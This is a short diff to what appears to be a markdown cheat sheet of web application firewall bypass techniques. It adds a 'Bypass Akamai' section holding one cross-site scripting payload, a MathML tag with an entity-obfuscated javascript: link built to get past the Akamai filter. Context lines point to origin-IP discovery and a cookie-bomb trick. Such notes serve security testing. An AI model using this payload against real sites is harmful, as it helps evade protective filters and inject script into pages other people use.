@@ -349,6 +349,11 @@ https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limita
 - Identify server origin
 https://github.com/gwen001/cloudflare-origin-ip
 
+### Bypass Akamai 
+```
+<math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>
+```
+
 ### Cookie Bomb
 Can be used to demonstrate the fact of put "low" Accessibility in a CVSS
 ```js
